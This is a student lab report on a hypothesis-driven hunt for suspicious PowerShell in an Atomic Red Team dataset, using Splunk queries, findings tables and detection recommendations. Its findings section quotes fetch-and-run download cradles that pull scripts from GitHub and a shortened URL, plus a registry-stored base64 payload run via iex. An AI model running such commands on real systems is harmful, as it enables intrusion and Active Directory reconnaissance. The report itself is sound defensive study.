Assignment 2 Week 5 Karabalin Bakhtiyar and Tulepbergen Beksultan

# Threat Hunting Concept: Hypothesis-Driven Hunt for Suspicious PowerShell Activity

## Executive Summary

This report introduces the two core threat hunting models (intel-driven and hypothesis-driven) and applies the hypothesis-driven model in practice. A hunting scenario was built around suspicious PowerShell activity, the most common living-off-the-land technique in the MITRE ATT&CK matrix (T1059.001). Splunk Enterprise was deployed in Docker on Kali Linux, and a public Atomic Red Team dataset (T1059.001, from the `splunk/attack_data` repository) was ingested: 21,714 Sysmon events and 170,846 PowerShell Operational log events from the host `win-dc-974.attackrange.local`. Five hunt queries were executed in SPL. The hunt found 186 PowerShell process launches, of which 51 events matched the suspicious-flag filter (encoded commands, download cradles, hidden or bypass switches), and script block logs contained download cradles, registry-stored payloads and embedded base64 executables. The hypothesis was **confirmed on the lab data**. The hunt also produced a baseline finding: the largest parent of PowerShell in the dataset (68 events) was the Splunk Universal Forwarder, which is legitimate and must be allowlisted in any production detection.

----------

## Section 1: Threat Hunting Concept

### 1.1 What Threat Hunting Is

Threat hunting is the proactive and iterative search through telemetry for adversary activity that automated detections have missed. Unlike alert triage, a hunt does not start from an alert. It starts from a question, and its outcome is either a finding (an incident, or a new detection opportunity) or a documented negative result that proves a behavior is not present.

### 1.2 Hunting Models

| Aspect | Intel-driven hunting | Hypothesis-driven hunting |
|---|---|---|
| Starting point | Threat intelligence: IOCs, reports, feeds, campaign write-ups | An assumption about adversary behavior, usually built on MITRE ATT&CK |
| Question asked | "Do the known indicators from this report appear in our environment?" | "If an attacker were already inside, how would they abuse this technique, and what would it leave in the logs?" |
| Typical data | IP addresses, domains, hashes, file names | Process trees, command lines, script content, parent-child relations |
| Strengths | Fast, precise, easy to automate, good for known campaigns | Finds new or modified tradecraft, not tied to specific indicators, improves detection coverage |
| Weaknesses | Indicators expire quickly and attackers change them cheaply; blind to unknown threats | Needs analyst skill and good telemetry; results are noisier and need baselining |
| Example from this course | The IOCs stored in the MISP event in Week 3 (four `ip-dst` attributes) could be searched across logs | The PowerShell scenario in this report |

The two models complement each other. Intel-driven hunting answers whether a known threat is present. Hypothesis-driven hunting answers whether a known *behavior* is present, even when the indicators are new.

### 1.3 The Hunting Loop

A hunt follows a repeatable cycle:

1. **Create a hypothesis.** Formulate a testable statement about adversary behavior.
2. **Collect and prepare data.** Identify the log sources that would show the behavior.
3. **Investigate.** Run queries, pivot, and filter out legitimate activity.
4. **Conclude.** Confirm or reject the hypothesis, and classify findings as true or false positives.
5. **Improve.** Convert the useful logic into a permanent detection and record gaps in telemetry.

Public frameworks describe the same cycle in similar terms. Splunk's PEAK framework (Prepare, Execute, Act) distinguishes hypothesis-driven, baseline and model-assisted hunts, and the TaHiTI methodology describes how threat intelligence feeds the hunting process.

----------

## Section 2: Hunting Scenario

### 2.1 Hypothesis

> An adversary who has gained code execution on a Windows host uses PowerShell to run code stealthily: encoded commands (`-EncodedCommand`), hidden or policy-bypassing sessions, and download cradles (`DownloadString`, `Invoke-Expression`, `Net.WebClient`) that fetch and run a payload in memory.

### 2.2 MITRE ATT&CK Mapping

| Tactic | Technique | ID | Behavior looked for |
|---|---|---|---|
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | `powershell.exe` with suspicious arguments |
| Defense Evasion | Obfuscated Files or Information | T1027 | Base64 payloads, abbreviated or obfuscated parameters |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 | `FromBase64String` followed by `Invoke-Expression` |
| Command and Control | Ingress Tool Transfer | T1105 | `DownloadString`, `DownloadFile`, `Invoke-WebRequest` |
| Execution | Windows Management Instrumentation | T1047 | PowerShell spawned by `WmiPrvSE.exe` |

### 2.3 Data Sources

| Source | Event | Used for |
|---|---|---|
| Sysmon (`Microsoft-Windows-Sysmon/Operational`) | EventID 1, Process Create | Process image, command line, parent process |
| PowerShell Operational (`Microsoft-Windows-PowerShell/Operational`) | EventCode 4104, Script Block Logging | Actual script content after deobfuscation by the engine |

### 2.4 Success Criteria

The hypothesis is considered confirmed if the data contains PowerShell executions with encoded or download-cradle behavior that cannot be explained by normal administration. Legitimate sources (monitoring agents, management tools) must be identified and separated from suspicious activity. The result is treated as negative for a given vector if the corresponding query returns no matching events.

----------

## Section 3: Environment and Hunt Execution

### 3.1 Splunk Deployment

Splunk Enterprise was deployed locally as a Docker container on the Kali Linux virtual machine, using the official `splunk/splunk` image:

```bash
sudo docker run -d --name splunk \
  -p 8000:8000 -p 8089:8089 \
  -e SPLUNK_START_ARGS="--accept-license" \
  -e SPLUNK_GENERAL_TERMS="--accept-sgt-current-at-splunk-com" \
  -e SPLUNK_PASSWORD="<lab password>" \
  -v splunk-var:/opt/splunk/var \
  -v splunk-etc:/opt/splunk/etc \
  splunk/splunk:latest
```

The container reached the `healthy` state and the web interface became available at `http://localhost:8000`. A dedicated index was then created:

```bash
sudo docker exec -u splunk splunk /opt/splunk/bin/splunk add index windows -auth admin:<lab password>
```

================================================================================
![alt text](<Screens/shot01_docker_ps.png>)
![alt text](<Screens/shot02_splunk_home.png>)
![alt text](<Screens/shot03_index_windows.png>)
================================================================================

### 3.2 Dataset and Ingestion

Instead of a live Windows endpoint, a public dataset was used: the Atomic Red Team data for technique T1059.001 from the `splunk/attack_data` repository. The files (`windows-sysmon.log`, about 38 MB, and `windows-powershell.log`, about 6 MB) were downloaded and loaded with the Splunk one-shot ingestion command:

```bash
sudo docker cp sysmon.log splunk:/tmp/sysmon.log
sudo docker cp powershell.log splunk:/tmp/powershell.log

sudo docker exec -u splunk splunk /opt/splunk/bin/splunk add oneshot /tmp/sysmon.log \
  -index windows -sourcetype XmlWinEventLog \
  -rename-source "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" \
  -auth admin:<lab password>

sudo docker exec -u splunk splunk /opt/splunk/bin/splunk add oneshot /tmp/powershell.log \
  -index windows -sourcetype XmlWinEventLog \
  -rename-source "XmlWinEventLog:Microsoft-Windows-PowerShell/Operational" \
  -auth admin:<lab password>
```

The ingestion was verified with a count by source (time range: All time):

```spl
index=windows | stats count by source, sourcetype
```

| Source | Events |
|---|---|
| XmlWinEventLog:Microsoft-Windows-PowerShell/Operational | 170,846 |
| XmlWinEventLog:Microsoft-Windows-Sysmon/Operational | 21,714 |

================================================================================
![alt text](<Screens/shot04_dataset_download.png>)
![alt text](<Screens/shot05_oneshot_ingest.png>)
![alt text](<Screens/shot06_source_counts.png>)
================================================================================

**Data handling notes.** Sysmon events are stored as XML, so the fields (`Image`, `CommandLine`, `ParentImage`, `Computer`, `EventID`) were extracted at search time with `rex`. The PowerShell log is stored as `key=value` text, where each line was indexed as a separate event, so script content was searched as text. The index timestamps reflect the time of ingestion rather than the original 2021 event times, so no time-series analysis was performed.

### 3.3 Hunt Query 1: All PowerShell Launches (Baseline)

```spl
index=windows
| rex field=_raw "<EventID>(?<EventID>\d+)</EventID>"
| search EventID=1
| rex field=_raw "<Computer>(?<Computer>[^<]*)</Computer>"
| rex field=_raw "<Data Name=.Image.>(?<Image>[^<]*)"
| rex field=_raw "<Data Name=.CommandLine.>(?<CommandLine>[^<]*)"
| rex field=_raw "<Data Name=.ParentImage.>(?<ParentImage>[^<]*)"
| search Image="*powershell.exe"
| table _time Computer ParentImage CommandLine
```

**Result:** 186 PowerShell process creations on `win-dc-974.attackrange.local`. Many command lines already show `-NoProfile -EncodedCommand` followed by a base64 string, launched by `WmiPrvSE.exe`.

================================================================================
![alt text](<Screens/shot07_q1_all_powershell.png>)
================================================================================

### 3.4 Hunt Query 2: Suspicious Flags (Main Hunt)

```spl
index=windows
| rex field=_raw "<EventID>(?<EventID>\d+)</EventID>"
| search EventID=1
| rex field=_raw "<Computer>(?<Computer>[^<]*)</Computer>"
| rex field=_raw "<Data Name=.Image.>(?<Image>[^<]*)"
| rex field=_raw "<Data Name=.CommandLine.>(?<CommandLine>[^<]*)"
| rex field=_raw "<Data Name=.ParentImage.>(?<ParentImage>[^<]*)"
| search Image="*powershell.exe"
| search CommandLine="*-enc*" OR CommandLine="*EncodedCommand*" OR CommandLine="*hidden*" OR CommandLine="*bypass*" OR CommandLine="*DownloadString*" OR CommandLine="*IEX*" OR CommandLine="*Invoke-WebRequest*"
| stats count values(CommandLine) as commands by Computer ParentImage
| sort - count
```

**Result:** 51 matching events grouped into 5 parent-process groups. The two largest groups:

| Parent process | Count | Observed behavior |
|---|---|---|
| `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | 17 | PowerShell launching PowerShell with `-NoProfile -Enc`, `-Enco`, `-Encod`, `-Encode`, `-Encoded`, `-EncodedC`... (every abbreviation of the `-EncodedCommand` parameter), commands built with `Out-ATHPowerShellCommandLineParameter`, and a download of a script from `raw.githubusercontent.com` |
| `C:\Windows\System32\wbem\WmiPrvSE.exe` | 15 | `powershell.exe -NoProfile -Enc <base64>` and the same series of abbreviated parameters |

================================================================================
![alt text](<Screens/shot08_q2_suspicious_flags.png>)
================================================================================

### 3.5 Hunt Query 3: Parent-Process Analysis

```spl
index=windows
| rex field=_raw "<EventID>(?<EventID>\d+)</EventID>"
| search EventID=1
| rex field=_raw "<Data Name=.Image.>(?<Image>[^<]*)"
| rex field=_raw "<Data Name=.ParentImage.>(?<ParentImage>[^<]*)"
| search Image="*powershell.exe"
| stats count by ParentImage
| sort - count
```

**Result:**

| Parent process | PowerShell launches |
|---|---|
| `C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe` | 68 |
| `C:\Windows\System32\wbem\WmiPrvSE.exe` | 57 |
| `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | 33 |
| `C:\Windows\System32\cmd.exe` | 12 |
| `C:\Windows\explorer.exe` | 1 |

The parent process could be extracted for 171 of the 186 launches. The bar chart below shows the same distribution.

================================================================================
![alt text](<Screens/shot09_q3_parent_table.png>)
![alt text](<Screens/shot10_q3_parent_chart.png>)
================================================================================

### 3.6 Hunt Query 4: Office and Script-Host Parents

```spl
index=windows
| rex field=_raw "<EventID>(?<EventID>\d+)</EventID>"
| search EventID=1
| rex field=_raw "<Computer>(?<Computer>[^<]*)</Computer>"
| rex field=_raw "<Data Name=.Image.>(?<Image>[^<]*)"
| rex field=_raw "<Data Name=.ParentImage.>(?<ParentImage>[^<]*)"
| rex field=_raw "<Data Name=.CommandLine.>(?<CommandLine>[^<]*)"
| search Image="*powershell.exe" (ParentImage="*winword.exe" OR ParentImage="*excel.exe" OR ParentImage="*wscript.exe" OR ParentImage="*cscript.exe" OR ParentImage="*mshta.exe")
| table _time Computer ParentImage CommandLine
```

**Result:** 0 events. The phishing-style vector (Office document or script host launching PowerShell) is **not present** in this dataset. This is consistent with the parent-process table above, which contains none of these parents. This is a documented negative result for this vector.

================================================================================
![alt text](<Screens/shot11_q4_office_parents_zero.png>)
================================================================================

### 3.7 Hunt Query 5: Script Block Content

Script Block Logging (EventCode 4104) records the code that PowerShell actually executes, including content that was encoded on the command line. Because each log line was indexed as a separate event, the search looked for suspicious constructs in the text and grouped identical lines:

```spl
index=windows source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational"
("FromBase64String" OR "DownloadString" OR "Net.WebClient" OR "Invoke-Expression" OR "IEX")
| stats count by _raw
| sort - count
| head 20
```

**Result:** 33 matching events, with the top 20 distinct lines reviewed.

================================================================================
![alt text](<Screens/shot12_q5_scriptblock.png>)
================================================================================

----------

## Section 4: Findings and Analysis

### 4.1 Findings from Script Block Content

| # | Observed content | What it does | ATT&CK |
|---|---|---|---|
| 1 | `IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/.../SharpHound.ps1')` | Download cradle: fetches a script from the internet and executes it in memory without writing a file. SharpHound is an Active Directory enumeration collector | T1059.001, T1105 (follow-on AD discovery) |
| 2 | `(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e', ...)` followed by `[ScriptBlock]::Create(...)` | Downloads from a shortened URL that hides the real destination, then builds and runs the script | T1105, T1027 |
| 3 | `iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))` | Reads a base64 payload stored in the registry, decodes it and executes it; no payload file on disk | T1140, T1027 |
| 4 | `$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/...'` | Script content referencing the PowerSploit post-exploitation framework | T1105, T1059.001 |
| 5 | `$TemplateSourceBytes = [Convert]::FromBase64String('TVqQAAMAAAAEAAAA...')` | A long base64 string beginning with `TVqQ`, which is how the `MZ` header of a Windows executable appears in base64; indicates an embedded executable | T1027, T1140 |

Lines such as `Invoke-Expression $streamcommand` and `OpenRead($url).copyto($ms)` are not conclusive by themselves. They need context (who launched them, from where, and what followed), which is why script block content should be correlated with the process tree.

================================================================================
![alt text](<Screens/shot13_finding_expanded.png>)
================================================================================

### 4.2 Findings from the Process Tree

1. **Encoded commands spawned by WMI (true positive candidates).** `WmiPrvSE.exe` launched PowerShell 57 times, and the suspicious-flag query shows 15 of these events with `-NoProfile -EncodedCommand`. PowerShell started by the WMI provider host is a recognized pattern of remote or WMI-based execution (T1047) and should never be treated as routine on a workstation or server without a documented management tool behind it.
2. **Parameter abbreviation as evasion.** The command lines contain a series of abbreviations of the same parameter (`-Enc`, `-Enco`, `-Encod`, and so on), generated with `Out-ATHPowerShellCommandLineParameter`. PowerShell accepts any unambiguous prefix of a parameter name, so a rule that matches only the full string `-EncodedCommand` would miss these variants. The hunt query used the pattern `*-enc*`, which caught all of them.
3. **PowerShell launched by PowerShell.** 33 launches have `powershell.exe` as the parent, and 17 of them match the suspicious-flag filter. Nested PowerShell with encoded arguments is typical for staged execution.
4. **Legitimate baseline (false positives).** The largest parent, `splunkd.exe` (68 launches), is the Splunk Universal Forwarder running its own PowerShell-based inputs. These launches did not appear among the suspicious-flag groups shown in the results and represent expected monitoring-agent activity. Without this baseline, a naive "alert on PowerShell" rule would be dominated by noise.
5. **Phishing-style vector not observed.** No Office or script-host parent was found (Hunt Query 4).

### 4.3 Hypothesis Evaluation

| Element of the hypothesis | Result |
|---|---|
| Encoded commands (`-EncodedCommand` and abbreviations) | **Confirmed**: present, including WMI-launched instances |
| Download cradles (`DownloadString`, `DownloadFile`, `Invoke-Expression`) | **Confirmed**: present in script block logs |
| In-memory or registry-stored payloads | **Confirmed**: registry-stored base64 payload and embedded executable bytes |
| Office or script-host initial vector | **Not observed** |

**Overall:** the hypothesis is confirmed on the lab dataset. The data is generated by Atomic Red Team, so all positive findings are simulated test activity and should not be read as a real intrusion.

### 4.4 Limitations

- The dataset is a controlled simulation of a single host, so false-positive rates in a real environment cannot be estimated from it.
- Index timestamps reflect ingestion time, which prevents timeline analysis.
- Script block log lines were indexed individually, so multi-part script blocks could not be reassembled into single events without additional parsing configuration.
- Parent-process data could be extracted for 171 of 186 launches; the remaining 15 did not match the extraction pattern.

----------

## Section 5: Conclusion and Recommendations

The hypothesis-driven approach found behavior that an indicator-based search would not have found: none of the activity here is tied to a specific IP address or file hash, but all of it follows a recognizable pattern in the process tree and command lines. This supports using the two models together, with intel-driven hunts (for example, the MISP IOCs from Week 3) answering whether known threats are present and hypothesis-driven hunts covering unknown tradecraft.

Detection recommendations derived from the hunt:

1. **Alert on PowerShell spawned by `WmiPrvSE.exe` with encoded arguments**, and on Office or script-host parents (none observed here, but the vector is high value).
2. **Detect encoded commands by pattern, not by exact string**, so that abbreviated parameters are covered. An example rule to validate before use: `| regex CommandLine="(?i)\s-(e|ec|en\w*)\s+[A-Za-z0-9+/=]{20,}"`.
3. **Alert on download cradles** in Script Block Logs (`DownloadString`, `DownloadFile`, `Net.WebClient` combined with `Invoke-Expression`/`IEX`).
4. **Allowlist known-good parents** such as the Splunk Universal Forwarder to keep the signal-to-noise ratio workable.
5. **Enable Script Block Logging and Sysmon process creation** on all endpoints, because both data sources were essential to this hunt.
6. **Link back to the Cyber Kill Chain (Week 4):** the observed behavior maps to the Delivery and Exploitation stages (download cradles) and to Installation or Command and Control preparation (payloads stored in the registry and in memory).

----------

## Sources

- Microsoft Threat Hunting Guide (recommended reading in the course assignment).
- P. Smith, *Practical Threat Hunting* (recommended reading in the course assignment).
- SANS Threat Hunting Summit materials (listed in the course assignment).
- MITRE ATT&CK (attack.mitre.org): T1059.001, T1027, T1140, T1105, T1047.
- Splunk, `splunk/attack_data` repository: Atomic Red Team dataset for T1059.001.
- Splunk PEAK Threat Hunting Framework; TaHiTI (Targeted Hunting integrating Threat Intelligence).
